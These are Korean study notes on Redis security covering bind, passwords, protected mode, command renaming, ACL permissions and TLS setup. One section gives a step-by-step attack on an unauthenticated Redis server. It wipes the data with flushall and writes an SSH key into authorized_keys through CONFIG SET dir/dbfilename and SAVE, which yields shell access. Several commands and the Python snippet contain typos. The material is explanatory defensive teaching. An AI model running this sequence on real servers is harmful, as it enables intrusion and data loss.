# CH.11 보안
## 커넥션 제어
### bind
- bind 설정은 레디스가 서버의 여러 ip 중 어떤 ip를 통해 들어오는 연결을 받아들일 것인지 지정한다.
- bind의 기본 설정값은 127.0.0.1이며, 이는 서버에 대한 루프백(로컬) IP 주소를 나타낸다.
- 기본값을 변경하지 않으면 레디스는 오직 동일한 서버 내에서의 연결만을 허용한다.
- bind 설정값 자체를 주석 처리하거나 0.0.0.0 또는 *로 설정하는 경우, 레디스는 서버가 가지고 있는 IP 주소로 들어오는 모든 연결을 허용하는 방식으로 동작한다.
- 그러나 레디스 인스턴스가 외부 인터넷에 노출되고 운영 목적으로 사용된다면, bind 설정값을 특정한 IP로 설정해서 의도하지 않은 연결을 방지하는 보안적인 설정을 권장한다.
### 패스워드
- 패스워드를 설정하는 데 두 가지 방법
  - 노드에 직접 패스워드를 지정하는 방식
  - ACL(Access Control List)기능을 사용하는 방식
```shell

127.0.0.1:6379> CONFIG SET requirepass password
OK
```
- `requirepass` 커맨드를 이용하면 레디스에 기본 패스워드를 설정할 수 있다.
- 패스워드는 `redis.conf`에서 지정한 뒤 실행시킬 수도 있고, 다음 커맨드를 사용해 운영 중에 변경하는 것도 가능하다.
- 패스워드가 설정된 노드에 접속하려면 접속 시 `-a` 옵션을 이용해 패스워드를 직접 지정할 수도 있으며, 해당 옵션을 사용하지 않고 접속한 뒤 `AUTH` 커맨드를 이용해 패스워드를 입력할 수도 있다.
```shell

$ redis-cli -a password
Warning: Using a password with '-a' or '-u' option on the command line
interface may not be safe.
```
```shell

$ redis-cli
127.0.0.1:6379> PING
(error) NOAUTH Authentication required.

127.0.0.1:6379> AUTH password
OK

127.0.0.1:6379> PING
PONG
```
- 패스워드가 설정돼 있는 인스턴스에 접속한 뒤 인증을 하지 않으면 아무런 커맨드를 사용할 수 없다.
- `AUTH` 커맨드를 이용해 패스워드를 입력해야 다른 커맨드를 사용할 수 있게 된다.
### Protected mode
- protected mode는 레디스를 운영 용도로 사용한다면 설정하는 것을 권장한다.
- protected mode가 yes일 때 레디스 인스턴스에 패스워드를 설정하지 않았다면 레디스는 127.0.0.1 IP를 이용해 로컬에서 들어오는 연결만을 허용한다.
- bind 설정을 이용해 다른 네트워크 인터페이스를 이용해 들어온 커넥션을 허용한다고 설정했을 경우에도 마찬가지다.
## 커맨드 제어
- `CONFIG GET` 커맨드를 이용하면 레디스에 지정된 설정값을 읽어올 수 있으며, 대부분의 파라미터는 `CONFIG SET` 커맨드를 이용해 재설정할 수 있다. 
- 운영자가 커맨드라인으로 편리하게 인스턴스를 제어할 수 있다는 장점이 있지만, 레디스에 접근할 수 있는 모든 클라이언트가 레디스 인스턴스를 제어할 수 있다는 점에서는 위험할 수 있다.
### 커맨드 이름 변경
- `rename-command`는 레디스에서 특정 커맨드를 다른 이름으로 변경하거나, 커맨드를 비활성화할 수 있는 설정이다.
- 이 설정을 사용하면 레디스의 커맨드를 커스터마이징 하거나 보안을 강화하는데 도움이 된다.
- `rename-command` 설정은 `redis.conf` 파일에서 변경할 수 있으며, 실행 중에는 동적으로 변경할 수 없다.
```shell

rename-command CONFIG ""
```
- `rename-command`로 커맨드를 빈 문자열로 변경하면 해당 커맨드는 사용할 수 없게 된다.
- 센티널은 레디스 인스턴스를 감시하고 있다가 마스터에 장애가 발생했다고 판단하면 직접 레디스로 `REPLICAOF`, `CONFIG` 등의 커맨드를 날려 레디스 인스턴스를 제어한다.
- 만약 `rename-command`를 이용해 레디스에서 커맨드 이름을 변경했다면 장애 상황에서 센티널이 전송하는 커맨드를 레디스가 정상적으로 수행할 수 없어 페일오버가 정상적으로 발생하지 않게 된다.
- 따라서 `redis.conf`에서 변경한 커맨드는 `sentinel.conf`에서도 변경해야 한다.
### 커맨드 실행 환경 제어
- 레디스 버전 7부터는 보안을 강화하기 레디스가 실행중일 때 변경하면 위험할 수 있는 커맨드는 기본적으로 변경할 수 없도록 차단됐으며, 사용자는 이러한 커맨드의 변경을 아예 차단 또는 허용하거나, 로컬 연결에서만 변경이 가능할 수 있도록 선택할 수 있다.
```shell

enable-protected-configs no
enable-debug-command no
enable-module-command no
```
- `enable-protected-configs` 설정은 레디스의 기본 경로 설정인 dir 및 백업 파일의 경로를 지정하는 dbfile 등의 옵션을 `CONFIG` 커맨드로 수정하는 것을 차단하는 옵션이다.
### 레디스를 이용한 해킹 사례
```text
       server A
     (203.0.113.1)                     server B
┌─────────────────────┐        ┌───────────────────────┐
│  port 6379          │        │  redis-cli -h         │
│  protected-mode no  │  ←─────│─ 203.0.113.1 -p 6379  │
│  requirepass " "    │        │                       │
└─────────────────────┘        └───────────────────────┘ 
```
- 레디스의 `protected-mode` 설정값은 no로 지정돼 있으며, 패스워드는 설정되지 않았다고 가정해보자.
```shell

[centos@serverB ~]$ telnet 203.0.113.1 6379
Trying 203.0.113.1...
Connected to 203.0.113.1.
Escape character is '^]'.
echo "no AUTH"
$7
no AUTH
quit
+OK
Connection closed by foreign host.
```
- Telnet 연결이 가능하다는 것을 확인했으므로 네트워크 통신이 가능한 것을 알 수 있으며, 또한 redis-cli를 사용해 패스워드 없이 연결하는 것도 가능하다.
- 서버 B에서 SSH 키를 생성하고, 이 키의 데이터를 레디스를 통해 서버 A로 전송해 파일로 저장한 후, 이 키를 사용해 서버 B에서 서버 A로의 접근을 가능하게 해보자.
```text
                server A
             (203.0.113.1)                                    server B
┌─────────────────────────────────────┐        ┌───────────────────────────────────┐
│                  save ←─────────────│────────│──redis-cli -h 203.0.113.1 -p 6379 │
│                    ↓                │        │              ↑ set                │
│  /home/centos/.ssh/authorized_keys  │        │             file                  │
└─────────────────────────────────────┘        └───────────────────────────────────┘ 
```
```shell

[centos@serverB ~]$ ssh-keygen -t rsa
Generating public/private sa key pair.
Enter file in which to save the key (/home/centos/.ssh/id_rsa): •/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa.
Your public key has been saved in ./id_rsa.pub.
The key fingerprint is:
SHA256: XxxXxX
The key's randomart image is:
+-[RSA 2048] ----+
```
- `ssh-keygen`을 이용해 생성한 키는 `id_rsa.pub`이라는 이름으로 B 서버에 저장됐다. 
- 파일의 앞뒤에 공백 문자를 넣어 key.txt라는 텍스트 파일을 생성해보자.
```shell

[centos@serverB ~]$ (echo -e "In\n"; cat id_rsa.pub; echo -e "In\n") > key. txt
```
- 서버 B에서 A의 레디스로 접근해서 레디스의 내용을 전체 삭제한 뒤, 방금 생성한 텍스트 파일을 데이터로 넣어줄 것이다.
```shell

[centos@serverB ~]$ redis-cli -h 203.0.113.1 echo flushall
[centos@serverB ~]$ cat key.txt | redis-cli -h 203.0.113.1 -x set key
```
- 서버 A의 레디스에 직접 접근해 데이터가 저장되는 경로와 파일명을 변경해주자.
```shell

[centos@serverB ~]$ redis-cli -h 203.0.113.1 -p 6379
203.0.113.1:6379> CONFIG SET dir /home/centos/.ssh/
OK

203.0.113.1:6379> CONFIG GET dir
1) "dir"
2) "/home/centos/.ssh"

203.0.113.1:6379> CONFIG SET dbfilename authorized_keys
OK
203.0.113.1:6379> SAVE
OK
```
- dir와 dbfilename 설정값을 변경한 뒤 SAVE 커맨드를 사용하면 `/home/centos/.ssh` 경로에 `authorized_keys` 파일명으로 RDB 파일이 저장된다.
- 서버 B에서 생성한 SSH키를 서버 A에 직접 복사하는 대신, 레디스를 이용해서 데이터를 간접적으로 전달함으로써, 서버 B에서 생성한 SSH키를 사용해 서버 A에 직접 접근할 수 있게 됐다.
```shell

[centos@serverB ~]$ ssh -1 id_rsa centos@ 203.0.113.1
[centos@serverA ~]$
```
## ACL
- ACL(Access Control List) 기능은 유저라는 개념을 도입해, 각 유저별로 실행 가능한 커맨드와 접근가능한 키를 제한하는 기능이다.
- 버전 6 이전에는 유저라는 개념이 없었기 때문에 인스턴스의 패스워드를 알고 있다면 해당 인스턴스에서 모든 커맨드를 실행하고, 전체 키에 접근해 인스턴스의 상태를 변경할 수 있었다.
- 레디스에 접근하는 클라이언트의 권한을 제어할 수 없었다.
```shell

ACL SETUSER garimoo on >password ~cached:* &* +@all -@dangerous
OK
```
- garimoo라는 이름을 가진 활성상태의 유저를 생성하며, 패스워드는 password로 설정했다.
- garimoo 유저가 접근가능한 키는 `cached:` 의 프리픽스를 가진 모든 키이며, 이 외의 키에는 접근할 수 없다.
- 제한없이 모든 채널에 pub/sub 할 수 있으며, 위험한 커맨드를 제외한 전체 커맨드를 사용할 수 있는 권한을 부여받았다는 것을 의미한다.
### 유저의 생성과 삭제
- 특정 유저를 확인하고 싶을 때에는 `ACL GETUSER` 커맨드를 사용할 수 있다.
```shell

127.0.0.1:10379> acl getuser garimoo
 1) "flags"
 2) 1) "on"
 3) "passwords"
 4) 1) "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
 5) "commands"
 6) "+@all -@dangerous"
 7) "keys"
 8) "~cached:*"
 9) "channels"
10) "&*"
11) "selectors"
12) (empty array)
```
- garimoo 유저가 `user:`로 시작하는 프리픽스를 가진 키에도 접근할 수 있는 권한을 부여하고 싶다면 다음과 같이 `acl setuser`를 한번 더 수행하자.
```shell

> ACL SETUSER garimoo ~id:*
OK

> ACL GETUSER garimoo
 1) "flags"
 2) 1) "on"
 3) "passwords"
 4) 1) "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
 5) "commands"
 6) "+@all -@dangerous"
 7) "keys"
 8) "~cached:* ~id:*"
 9) "channels"
10) "g*"
11) "selectors"
12) (empty array)
```
- `ACL DELUSER`를 이용하면 생성한 유저를 삭제할 수 있다.
```shell

> ACL DELUSER garimoo
(integer) 1
```
- 레디스를 설치한 뒤 아무런 패스워드와 유저를 생성하지 않았다면 다음과 같은 기본 유저가 존재한다.
```shell

> ACL LIST
1) "user default on nopass ~* &* +@all"
```
- 유저 이름: default
- 유저 상태: on (활성 상태)
- 유저 패스워드: nopass(패스워드 없음)
- 유저가 접근할 수 있는 키: ~*(전체 키)
- 유저가 접근할 수 있는 채널: &*(전체 채널)
- 유저가 접근할 수 있는 커맨드: +@all(전체 커맨드)
### 유저 상태 제어
- 유저의 활성 상태는 on과 off로 제어할 수 있다.
```shell

> ACL SETUSER user1
OK

> ACL GETUSER user1
1) "flags"
2) 1) "off"

> ACL SETUSER useri on
OK

> ACL GETUSER user1
1) "flags"
2) 1) "on"
```
### 패스워드
- \> 패스워드 키워드로 패스워드를 지정할 수 있다.
- 패스워드는 1개 이상 지정할 수 있으며, \<패스워드 키워드를 사용하면 지정한 패스워드를 삭제할 수 있다.
- 기본적으로 패스워드를 지정하지 않으면 유저에 접근할 수 없으나, nopass 권한을 부여하면 유저에는 패스워드 없이 접근할 수 있다.
- 유저에 nopass 권한을 부여하면 기존 유저에 설정돼 있는 모든 패스워드도 모두 삭제된다.
- 유저에 resetpass 권한을 부여하면 유저에 저장된 모든 패스워드가 삭제되며, 이때 nopass 상태도 없어진다.
- 유저에 대해 resetpass 키워드를 사용하면 추가로 다른 패스워드나 nopass 권한을 부여하기 전까지는 그 유저에 접근할 수 없게 된다.
```shell

> ACL LIST
1) "user user on nopass resetchannels -@all"

> ACL SETUSER user resetpass
OK

127.0.0.1:10379> ACL LIST
1) "user useri on resetchannels -@all"
```
### 패스워드 저장 방식
- ACL을 사용하지 않고 기존의 requirepass를 이용해 레디스 인스턴스의 패스워드를 정의했을 때에는 암호화되지 않은 채로 패스워드가 저장됐기 때문에 설정파일에 접근할 수 있거나, 혹은 `CONFIG GET requirepass` 커맨드를 이용하면 누구나 패스워드를 확인할 수 있었다.
```shell

> CONFIG GET requirepass
1) "requirepass"
2) "mypassword"
```
- ACL을 이용해 패스워드를 저장하면 내부적으로 SHA256 방식으로 암호화 돼 저장되기 때문에 유저의 정보를 확인하고자 해도 패스워드 정보를 바로 조회할 수 없다.
```shell

> ACL SETUSER user:100 on >mypassword
OK

> ACL GETUSER user:100
1) "flags"
2) 1) "on"
3) "passwords"
4) 1) "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
```
- `ACL GENPASS` 커맨드를 이용하면 난수를 생성할 수 있다.
```shell

> ACL GENPASS
"05c8f9f6218ebebc97458272d5a79f0f01718190459e2c89eb832433405f1008"
```
### 커맨드 권한 제어
- ACL 기능을 이용해 유저가 사용할 수 있는 커맨드를 제어할 수 있다.
- 운영의 편의성을 위해 일부 커맨드는 그룹화돼 카테고리로 정리돼 있기 때문에 운영자는 커맨드를 일일이 직접 제어할 필요가 없다.
- 물론 개별 커맨드도 제어가 가능하며, 서브 커맨드가 있는 경우 특정한 서브 커맨드를 제어하는 것도 가능하다.
- `+@all` 혹은 `allcommands` 키워드는 모든 커맨드의 수행권한을 부여한다는 것을 의미하며, `-@all` 혹은 `nocommands`는 아무런 커맨드를 수행할 수 없다는 것을 뜻한다.
- 특정 카테고리의 권한을 추가하려면 `+@<category>`, 제외하려면 `-@<category>`를 사용할 수 있으며, 개별 커맨드의 권한을 추가, 제외하려면 @ 없이 바로 `+<command>`나 `-<command>`를 사용하면 된다.
```shell

> ACL SETUSER user1 +@all -@admin +bgsave +slowloglget
```
- ACL 룰은 왼쪽부터 오른쪽으로 순서대로 적용된다.
- user1에 모든 커맨드의 수행권한을 부여한 뒤, admin 카테고리의 커맨드 수행권한은 제외시킨다.
- 그 뒤 `bgsave` 커맨드와 `slowlog` 커맨드 중 `get`이라는 서브 커맨드에 대한 수행권한만 추가로 다시 부여하게 된다.
- `ACL CAT` 커맨드를 이용하면 레디스에 미리 정의돼 있는 카테고리의 커맨드 list를 확인할 수 있다.
```shell

> ACL CAT
 1) "keyspace"
 2) "read"
 3) "write"
 4) "set"
 5) "sortedset"
 6) "list"
 7) "hash"
 8) "string"
 9) "bitmap"
10) "hyperloglog"
11) "geo"
12) "stream"
13) "pubsub"
14) "admin"
15) "fast"
16) "slow"
17) "blocking"
18) "dangerous"
19) "connection"
20) "transaction"
21) "scripting"
```
- 각 카테고리에 포함된 상세 커맨드를 확인하려면 `ACL CAT <카테고리명>`으로 확인할 수 있다.
#### dangerous
- `dangerous` 카테고리에는 아무나 사용하면 위험할 수 있는 커맨드가 포함돼 있다.
- 레디스 구성을 변경하는 커맨드, 혹은 한 번 수행하면 오래 수행할 수 있는 가능성이 있어 장애를 발생시킬 수 있는 커맨드, 혹은 운영자가 아니면 사용하지 않아도 되는 커맨드가 포함돼 있다.
- 구성 변경 커맨드
  1. replconf
  2. replicaof
  3. migrate
  4. failover
- 장애 유발 커맨드
  5. sort
  6. flushdb
  7. flushall
  8. keys
- 운영 커맨드
  - shutdown
  - monitor
  - acl|log, acl|deluser, acl|list, acl|setuser
  - bgsave, bgrewriteaof
  - info
  - config|get, config|set, config|rewrite, config|resetstat
  - debug
  - cluster|addslots, cluster|forget, cluster|failover
  - latency|graph, latency|doctor, latency|reset, latency|history
  - client|list, client| kill, client|pause
  - module|loadex, module|list, module|unload
- `replicaof`와 같은 커맨드는 마스터의 정보를 변경하기 때문에 운영자가 의도하지 않은 구성으로 변경할 수 있는 가능성이 존재한다.
- `sort`나 `keys`와 같은 커맨드는 메모리에 있는 모든 키들에 접근하기 때문에 데이터가 많이 저장돼 있는 경우 오랜기간 수행되며 다른 커맨드들의 수행을 막을 가능성이 있다.
- `client list` 혹은 `info`, `config get`과 같은 커맨드는 장애를 유발하진 않지만 레디스 인스턴스를 운영하는 사람이 아니라면 굳이 알지 않아도 되는 정보까지 노출할 수 있기 때문에 모든 사용자에게 노출할 필요가 없다.
#### admin
- `admin` 카테고리는 `dangerous` 카테고리에서 장애 유발 커맨드를 제외한 커맨드가 들어있다.
#### fast
- O(1)로 수행되는 커맨드를 모아놓은 카테고리다.
- get, spop, hset 등의 커맨드가 포함돼 있다.
#### slow
- fast 카테고리에 속하지 않은 커맨드가 들어있으며 scan, set, setbit, sunion 등의 커맨드를 포함한다.
#### keyspace
- 키와 관련된 커맨드가 포함된 카테고리다.
- scan, keys를 포함해 rename, type, expire, exists 등 키의 이름을 변경하거나 키의 종류를 파악하거나, 키의 TTL 값을 확인하거나 혹은 키가 있는지 확인하는 등의 커맨드를 포함한다.
#### read
- 데이터를 읽어오는 커맨드가 포함된 카테고리다.
- 각 자료구조별 읽기 전용으로 키를 읽어오는 커맨드를 포함한다.
- get, hget, xtrange 등이 있다.
#### write
- 메모리에 데이터를 쓰는 커맨드가 포함된 카테고리다.
- set, lset, setbit, hmset 등을 포함한다.
- 키의 만료시간 등의 메타데이터를 변경하는 expire, pexpire와 같은 커맨드도 포함한다.
### 키 접근 제어
- 유저가 접근할 수 있는 키도 제어할 수 있다.
- 레디스에서는 프리픽스를 사용해 키를 생성하는 것이 일반적이며, 프리픽스 규칙을 미리 정해뒀다면 특정한 프리픽스를 가지고 있는 키에만 접근할 수 있도록 제어할 수 있다.
- `~*` 혹은 `allkeys` 키워드는 모든 키에 대한 접근이 가능함을 의미하며, `~<pattern>`을 이용해 접근가능한 키를 정의할 수 있다.
- `%R~<pattern>` 커맨드는 키에 대한 읽기권한을, `%W~<pattern>` 커맨드는 키에 대한 쓰기 권한을 부여함을 의미한다.
- `%RW~<pattern>`으로 읽기, 쓰기 권한을 모두 부여할 수 있으나, 이는 앞서 소개한 `~<pattern>`과 동일함을 의미한다.
- loguser라는 유저에게 `log:` 프리픽스에 대한 모든 접근권한을 부여하고 싶지만, `mail:` 이나 `sms:`에 대해서는 읽기 접근권한만 부여하고 싶다면 다음과 같이 수행할 수 있다.
```shell

ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
```
### 셀렉터
```shell

ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
```
- 앞에서와 같은 권한이 있을 때 loguser는 `mail:*` 프리픽스 키에 대한 메타데이터도 가지고 올 수 있다.
- 예를 들어 `mail:1` 키에 대한 만료시간이 얼마나 남았는지 등의 정보도 확인할 수 있다.
```shell

> TTL mail:1
(integer) 95
```
- 하지만 loguser라는 유저는 `mail:*` 프리픽스 커맨드에 대해 다른 읽기 커맨드가 아닌 오직 GET 커맨드만 사용하도록 강제하고 싶을 수 있다.
- 이럴 경우 사용할 수 있는 것이 바로 셀렉터다.
```shell

> ACL SETUSER loguser resetkeys ~log:* (+GET ~mail:*)
```
- 위 명령어는 loguser에 정의된 모든 키를 리셋하고(resetkeys) log:에 대한 모든 접근권한을 부여한 뒤, `mail:` 에 대해서는 `get`만 가능하도록 설정한 것을 의미한다.
```shell

> TTL mail:1
(error) NOPERM this user has no permissions to access one of the keys used as arguments
```
### pub/sub 채널 접근 제어
- `all channels` 또는 `&*` 키워드로는 전체 pub/sub 채널에 접근할 수 있는 권한이 부여되며, `resetchannels` 권한은 어떤 채널에도 발행 또는 구독할 수 없음을 의미한다.
### 유저 초기화
- `reset` 커맨드를 이용해 유저에 대한 모든 권한을 회수하고 기본상태로 변경할 수 있다.
- `reset` 커맨드를 사용하면 `resetpass`, `resetkeys`, `resetchannels`, `off`, `-@all` 상태로 변경돼 `ACL SETUSER`를 한 직후와 동일해진다.
### ACL 규칙 파일로 관리하기
- 기본적으로는 일반 설정파일인 `redis.conf`에 저장되며, ACL 파일을 따로 관리해 유저정보만 저장하는 것도 가능하다.
- 만약 `/etc/redis/users.acl` 파일로 ACL 파일을 관리하고 싶다면 `redis.conf`에 다음 커맨드를 추가하면 된다.
```shell

aclfile /etc/redis/users.acl
```
- ACL 파일을 사용하지 않을 때에는 `CONFIG REWRITE` 커맨드를 이용해 레디스의 모든 설정값과 ACL 룰을 한 번에 `redis.conf`에 저장할 수 있다.
- ACL 파일을 따로 관리할 경우 `ACL LOAD`나 `ACL SAVE` 커맨드를 이용해 유저 데이터를 레디스로 로드하거나 저장하는 것이 가능해지기 때문에 운영 측면에서 조금 더 유용하게 사용할 수 있다.
## SSL/TLS
### SSL/TLS란?
- SSL(Secure Sockets Layer)은 암호화를 위한 인터넷 기반 보안 프로토콜
- TLS(Transport Layer Security)는 현재 널리 사용되고 있는 보안 프로토콜로, SSL에서 시작해서 발전해왔다.
- SSL은 1996년 이후로 업데이트되지 않았고, 현재는 대부분의 애플리케이션에서 더 안전한 TLS 프로토콜을 사용한다.
- SSL/TLS 프로토콜은 데이터 전송 과정에서 정보를 암호화함으로써 중간에서 데이터가 노출되거나 조작되는 것을 방지한다.
- 이 프로토콜은 클라이언트와 서버 간에 안전한 핸드셰이크 과정을 거치며, 이 과정에서 상호 인증을 진행해 두 통신 당사자가 모두 신뢰할 수 있는지 확인한다.
- 핸드셰이크 과정에서 사용되는 다양한 암호화 기술과 인증서는 통신의 무결성과 기밀성을 확보하는 데 중요한 역할을 한다.
- 무결성은 데이터가 전송 과정에서 왜곡되지 않았음을 보증하며, 기밀성은 제3자가 데이터를 열람할 수 없도록 보호한다.
### 레디스에서 SSL/TLS 사용하기
- SSL/TLS 프로토콜을 사용하기 위해서는 레디스를 처음 빌드할 때부터 다음과 같이 정의해야 한다.
```shell

make BUILD_TLS=yes
```
- 레디스에서 SSL/TLS 프로토콜을 사용할 때에는 레디스 인스턴스와 클라이언트 간 동일한 인증서를 사용한다.
- 따라서 다음 설정에서 정의한 key, cert, ca-cert 파일은 레디스를 실행할 클라이언트에 동일하게 복사해둬야 한다.
- redis.conf 파일에서 tls-port 값을 추가하면 SSL/TLS 연결을 사용할 것이라는 것을 의미한다.
```text
tls-port <포트 번호>
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
- 만약 기본 설정인 port와 tls-port 모두 지정했다면 레디스 인스턴스는 두 가지의 설정을 모두 받아들일 수 있다.
- 만약 보안을 강화하기 위해 인증서 없이는 레디스 인스턴스로의 접근을 할 수 없도록 막고 싶다면 port 0을 명시해 기본포트를 비활성화함으로써 SSL/TLS를 사용하지 않고서는 레디스에 접근할 수 없도록 할 수 있다.
- redis-cli를 이용해 SSL/TLS 프로토콜을 활성화한 인스턴스에 접속할 때에는 연결 시 다음과 같이 인증서를 입력해야 한다.
```shell

./src/redis-cli --tls \
--cert /path/to/redis.crt \
--key /path/to/redis.key \
--cacert /path/to/ca.crt
```
- 애플리케이션에서 레디스에 접속할 때에도 마찬가지다.
- 파이썬으로 위의 레디스에 접속하려면 다음과 같이 설정해야 한다.
```text
import os
import redis

ss1_certfile="/path/to/redis.crt"
ss1_keyfile="/path/to/redis.key"
ss1_ca_certs="/path/to/ca.crt"

ssl_cert_conn = redis.Redis(
    host="localhost",
    port=16379,
    ssl=True,
    ssl_certfile=ssl_certfile,
    sSl_keyfile=ssl_keyfile,
    ssl_cert_reqs="required",
    ssl_ca_certs=ss1_ca_certs,
)
    
ssl_cert_conn.ping()
```
### SSL/TLS를 사용한 HA 구성
#### 복제 구성
- SSL/TLS를 사용하는 마스터와 TLS 연결을 이용한 복제를 하기 위해서는 복제본도 마스터와 동일하게 다음 설정을 추가해야 한다.
```text

tls-port <포트 번호>

tls-replication yes

tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
- 복제본에서 마스터로 보내는 연결 또한 SSL/TLS 프로토콜을 이용하기 위해서는 tls-replication 값을 yes로 설정해야 한다.
#### 센티널 구성
- 센티널에서도 SSL/TLS 연결을 사용해 레디스에 접속할 수 있다.
```text
tls-port <포트 번호>

tls-replication yes

tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
#### 클러스터 구성
- 클러스터 구성에서 SSL/TLS 연결을 사용하려면 다음과 같이 tls-cluster yes 구문을 추가하자.
```text
tls-port <포트 번호>

tls-replication yes

tls-cluster yes

tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```